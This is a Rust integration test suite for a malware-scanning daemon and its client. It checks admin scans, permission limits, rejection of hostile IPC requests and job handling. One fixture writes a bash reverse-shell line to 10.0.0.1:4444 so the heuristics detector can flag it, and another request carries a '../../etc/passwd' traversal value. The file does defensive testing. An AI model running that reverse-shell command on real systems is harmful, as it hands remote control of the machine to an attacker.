//! Black-box tests of the service (`abyssal-wardend`) and its client
//! (`abyssal-warden service`), run as the current (unprivileged) user.
//! Privilege dropping as root is covered by the runner's user-namespace
//! test in warden-service.
#![cfg(target_os = "linux")]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::io::{Read, Write};
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Output};
use std::time::{Duration, Instant};

use warden_ipc::{ErrorCode, MAX_RESPONSE, Op, Reply, Request, Response};

const INDICATOR: &[u8] = b"ABYSSAL-WARDEN-SYNTHETIC-TEST-INDICATOR\n";

fn examples() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples")
}

fn uid() -> u32 {
    rustix::process::getuid().as_raw()
}

struct Daemon {
    child: Child,
    dir: tempfile::TempDir,
}

impl Daemon {
    /// Starts a daemon with `extra` configuration fields; `admin` makes the
    /// current user an administrator.
    fn start(admin: bool, extra: &str) -> Self {
        // Short path: Unix socket paths are limited to 107 bytes.
        let dir = tempfile::Builder::new()
            .prefix("aw")
            .tempdir_in("/tmp")
            .unwrap();
        Self::start_in(dir, admin, extra)
    }

    fn start_in(dir: tempfile::TempDir, admin: bool, extra: &str) -> Self {
        let d = dir.path();
        let admins = if admin {
            format!("[\"{}\"]", uid())
        } else {
            "[]".into()
        };
        let cfg = format!(
            r#"{{"socket":"{s}","state_dir":"{st}","quarantine_store":"{q}","admin_users":{admins}{extra}}}"#,
            s = d.join("w.sock").display(),
            st = d.join("state").display(),
            q = d.join("q").display(),
        );
        std::fs::write(d.join("cfg.json"), cfg).unwrap();
        let child = Command::new(env!("CARGO_BIN_EXE_abyssal-wardend"))
            .arg("--config")
            .arg(d.join("cfg.json"))
            .env("ABYSSAL_WARDEN_SYSLOG_SOCKET", "")
            .stderr(std::fs::File::create(d.join("daemon.log")).unwrap())
            .spawn()
            .unwrap();
        let me = Self { child, dir };
        let deadline = Instant::now() + Duration::from_secs(20);
        while UnixStream::connect(me.socket()).is_err() {
            assert!(
                Instant::now() < deadline,
                "daemon did not start: {}",
                me.log()
            );
            std::thread::sleep(Duration::from_millis(50));
        }
        me
    }

    fn socket(&self) -> PathBuf {
        self.dir.path().join("w.sock")
    }

    fn log(&self) -> String {
        std::fs::read_to_string(self.dir.path().join("daemon.log")).unwrap_or_default()
    }

    fn cli(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_abyssal-warden"))
            .arg("service")
            .arg("--socket")
            .arg(self.socket())
            .args(args)
            .output()
            .unwrap()
    }

    fn call(&self, op: Op) -> Reply {
        let mut s = UnixStream::connect(self.socket()).unwrap();
        warden_ipc::write_frame(&mut s, &Request::new(9, op), warden_ipc::MAX_REQUEST).unwrap();
        let r: Response = warden_ipc::read_frame(&mut s, MAX_RESPONSE).unwrap();
        assert_eq!(r.id, 9);
        r.reply
    }

    /// Stops the daemon (SIGTERM) and returns its directory.
    fn stop(mut self) -> tempfile::TempDir {
        let pid = rustix::process::Pid::from_child(&self.child);
        let _ = rustix::process::kill_process(pid, rustix::process::Signal::TERM);
        let deadline = Instant::now() + Duration::from_secs(20);
        loop {
            if self.child.try_wait().unwrap().is_some() {
                break;
            }
            assert!(Instant::now() < deadline, "daemon did not stop");
            std::thread::sleep(Duration::from_millis(50));
        }
        assert!(!self.socket().exists(), "socket left behind");
        let dir = tempfile::Builder::new().tempdir().unwrap();
        std::mem::replace(&mut self.dir, dir)
    }
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

fn stderr(o: &Output) -> String {
    String::from_utf8_lossy(&o.stderr).into_owned()
}

#[test]
fn administrator_scans_with_signed_content_and_heuristics() {
    let extra = format!(
        r#","content":["{}"],"keyrings":["{}"]"#,
        examples().join("bundle").canonicalize().unwrap().display(),
        examples()
            .join("keys/keyring.json")
            .canonicalize()
            .unwrap()
            .display()
    );
    let d = Daemon::start(true, &extra);
    let target = tempfile::tempdir().unwrap();
    std::fs::write(target.path().join("indicator.bin"), INDICATOR).unwrap();
    std::fs::write(
        target.path().join("x.sh"),
        "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
    )
    .unwrap();

    let status = d.cli(&["status"]);
    assert!(
        String::from_utf8_lossy(&status.stdout).contains("(administrator)"),
        "{}",
        stderr(&status)
    );

    let out = d.cli(&[
        "scan",
        "--heuristics",
        "--quarantine",
        "--wait",
        "--format",
        "json",
        target.path().to_str().unwrap(),
    ]);
    assert_eq!(out.status.code(), Some(1), "{}\n{}", stderr(&out), d.log());
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let findings = v["findings"].as_array().unwrap();
    let has = |key: &str, value: &str| findings.iter().any(|f| f["source"][key] == value);
    assert!(has("rule_id", "AW-HEU-031"), "{findings:?}");
    assert!(has("detector", "hash-signatures"), "{findings:?}");
    // Test indicators are never quarantined, even when asked.
    assert!(
        v["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|f| f["remediation_status"] == "not_eligible")
    );
    assert!(target.path().join("indicator.bin").exists());
    assert!(v["content_bundles"][0]["sequence"].as_u64().is_some());

    let Reply::Jobs { jobs } = d.call(Op::Jobs {}) else {
        panic!("jobs")
    };
    assert_eq!(jobs.len(), 1);
    assert_eq!(jobs[0].quarantined, Some(0));
    assert!(
        !jobs[0].as_owner,
        "administrator scans use the scanner account"
    );

    let audit = d.cli(&["verify-audit"]);
    assert_eq!(audit.status.code(), Some(0), "{}", stderr(&audit));
    // The report is kept (0600) and can be fetched again.
    let rep = d.cli(&["report", &jobs[0].id.to_string()]);
    assert!(String::from_utf8_lossy(&rep.stdout).contains("Script opens a reverse shell"));
}

#[test]
fn non_administrators_are_limited() {
    let d = Daemon::start(
        false,
        r#","schedules":[{"name":"nightly","paths":["/nonexistent"],"every_hours":24,"at_utc":"03:00"}]"#,
    );
    for args in [
        &["system-check"][..],
        &["quarantine", "list"],
        &["run-schedule", "nightly"],
        &["verify-audit"],
        &["scan", "--quarantine", "/tmp"],
    ] {
        let out = d.cli(args);
        assert_eq!(out.status.code(), Some(2), "{args:?}");
        assert!(
            stderr(&out).contains("unauthorized"),
            "{args:?}: {}",
            stderr(&out)
        );
    }
    // A plain scan runs with the caller's own permissions.
    let target = tempfile::tempdir().unwrap();
    std::fs::write(target.path().join("a.txt"), b"hello").unwrap();
    let out = d.cli(&["scan", "--wait", target.path().to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0), "{}\n{}", stderr(&out), d.log());
    let Reply::Jobs { jobs } = d.call(Op::Jobs {}) else {
        panic!("jobs")
    };
    assert!(jobs[0].as_owner);
    let Reply::Schedules { schedules } = d.call(Op::Schedules {}) else {
        panic!("schedules")
    };
    assert_eq!(schedules[0].name, "nightly");
    assert!(schedules[0].last_run.is_none());
    assert!(d.log().contains("denied"), "denials are logged");
}

#[test]
fn malformed_and_hostile_requests_are_rejected() {
    let d = Daemon::start(true, "");
    // Unknown operation, unknown field, wrong version, invalid arguments.
    for (raw, code) in [
        (
            r#"{"version":1,"id":1,"op":{"type":"format_disk"}}"#,
            "bad_request",
        ),
        (
            r#"{"version":1,"id":1,"op":{"type":"ping"},"admin":true}"#,
            "bad_request",
        ),
        (
            r#"{"version":2,"id":1,"op":{"type":"ping"}}"#,
            "version_mismatch",
        ),
        (
            r#"{"version":1,"id":1,"op":{"type":"scan","paths":["relative"]}}"#,
            "bad_request",
        ),
        (
            r#"{"version":1,"id":1,"op":{"type":"quarantine_delete","id":"../../etc/passwd"}}"#,
            "bad_request",
        ),
    ] {
        let mut s = UnixStream::connect(d.socket()).unwrap();
        s.write_all(&(raw.len() as u32).to_be_bytes()).unwrap();
        s.write_all(raw.as_bytes()).unwrap();
        let r: serde_json::Value = warden_ipc::read_frame(&mut s, MAX_RESPONSE).unwrap();
        assert_eq!(r["reply"]["type"], "error", "{raw}");
        assert_eq!(r["reply"]["code"], code, "{raw}");
    }
    // An oversized frame is refused before it is read, and the connection closed.
    let mut s = UnixStream::connect(d.socket()).unwrap();
    s.write_all(&(64u32 << 20).to_be_bytes()).unwrap();
    let r: serde_json::Value = warden_ipc::read_frame(&mut s, MAX_RESPONSE).unwrap();
    assert_eq!(r["reply"]["code"], "bad_request");
    let mut rest = Vec::new();
    s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    assert_eq!(s.read_to_end(&mut rest).unwrap_or(0), 0);
    // Several requests on one connection; unknown jobs are not found.
    let mut s = UnixStream::connect(d.socket()).unwrap();
    for i in 0..3 {
        warden_ipc::write_frame(
            &mut s,
            &Request::new(
                i,
                Op::Job {
                    job: uuid::Uuid::new_v4(),
                },
            ),
            1 << 16,
        )
        .unwrap();
        let r: Response = warden_ipc::read_frame(&mut s, MAX_RESPONSE).unwrap();
        assert_eq!(r.id, i);
        assert!(matches!(
            r.reply,
            Reply::Error {
                code: ErrorCode::NotFound,
                ..
            }
        ));
    }
    // The service still works.
    assert!(matches!(d.call(Op::Ping {}), Reply::Pong { .. }));
}

#[test]
fn single_instance_history_survives_restart_and_jobs_cancel() {
    let d = Daemon::start(true, r#","max_concurrent_jobs":1"#);

    // One worker: the second job waits in the queue and can be cancelled there.
    let scan = |p: &str| Op::Scan {
        paths: vec![p.into()],
        heuristics: true,
        no_archives: false,
        quarantine: false,
    };
    let Reply::JobStarted { job: first } = d.call(scan("/usr")) else {
        panic!("first")
    };
    let Reply::JobStarted { job: second } = d.call(scan("/usr/share")) else {
        panic!("second")
    };
    // A second instance with the same configuration refuses to start, and
    // leaves the running instance's queued job alone (it must not mark it
    // interrupted before finding the socket taken).
    let other = Command::new(env!("CARGO_BIN_EXE_abyssal-wardend"))
        .arg("--config")
        .arg(d.dir.path().join("cfg.json"))
        .output()
        .unwrap();
    assert_eq!(other.status.code(), Some(2));
    assert!(stderr(&other).contains("in use"), "{}", stderr(&other));
    let record: serde_json::Value = serde_json::from_slice(
        &std::fs::read(
            d.dir
                .path()
                .join("state/jobs")
                .join(format!("{second}.json")),
        )
        .unwrap(),
    )
    .unwrap();
    assert_eq!(record["state"], "queued", "{record}");
    assert!(matches!(
        d.call(Op::Cancel { job: second }),
        Reply::Done { .. }
    ));
    let _ = d.call(Op::Cancel { job: first });
    let deadline = Instant::now() + Duration::from_secs(60);
    let state = |id| match d.call(Op::Job { job: id }) {
        Reply::Job(j) => j.state,
        other => panic!("{other:?}"),
    };
    while !state(first).finished() {
        assert!(Instant::now() < deadline, "job did not stop");
        std::thread::sleep(Duration::from_millis(100));
    }
    assert_eq!(state(second), warden_ipc::JobState::Cancelled);
    assert!(matches!(
        state(first),
        warden_ipc::JobState::Cancelled | warden_ipc::JobState::Completed
    ));

    let dir = d.stop();
    let d = Daemon::start_in(dir, true, r#","max_concurrent_jobs":1"#);
    let Reply::Jobs { jobs } = d.call(Op::Jobs {}) else {
        panic!("jobs")
    };
    assert_eq!(jobs.len(), 2, "history survives a restart");
}
